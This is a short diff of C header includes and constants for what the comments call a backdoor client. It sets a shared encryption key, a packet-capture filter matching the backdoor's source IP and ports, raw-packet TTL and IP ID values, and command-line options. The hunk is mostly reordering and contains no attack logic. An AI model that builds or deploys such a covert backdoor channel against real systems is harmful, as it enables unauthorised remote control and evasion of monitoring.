@@ -5,28 +5,29 @@
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <netinet/udp.h>   	// UDP Header definitions
-#include <netinet/ip.h>    	// IP Header definitions
+#include <netinet/ip.h>    		// IP Header definitions
 #include <netinet/in.h>
 #include <netinet/if_ether.h>
 #include <sys/types.h>
 #include <unistd.h>
 #include <errno.h>
-#include <signal.h>
 #include <sys/types.h>
 #include <ctype.h>
 
 #define PKT_SIZE		    4096
 #define BUFLEN              1024
+#define MAXLINE			    80
+#define OPTIONS 		    "?h:d:s:p:i:"
+
+//User Defined Variables - Feel free to change these 
+#define ENCRYPTION_KEY      "zdehjk"  //Ensure this is the same as the backdoor key
+#define FILTER  "udp and src host %s and src port %d and dst port %d" //current backdoor looks for specific src_ip, src and dst ports
+#define DEFAULT_INTERFACE   "em1"
 #define DEFAULT_DST_PORT	7999
 #define DEFAULT_SRC_PORT	8000
-#define DEFAULT_TTL		    255
-#define DEFAULT_IP_ID		12345
-#define MAXLINE			    80
 #define DEFAULT_SRC_IP		"192.168.0.5"
-#define OPTIONS 		    "?h:d:s:p:i:"
-#define ENCRYPTION_KEY      "zdehjk"  //Ensure this is the same as the backdoor key
-#define FILTER              "udp and src host %s and src port %d and dst port %d" //current backdoor looks for specific src_ip, src and dst ports
-#define DEFAULT_INTERFACE   "em1"
+#define DEFAULT_TTL		255
+#define DEFAULT_IP_ID		12345
 
 // Globals
 typedef struct    //needed for checksum calculation
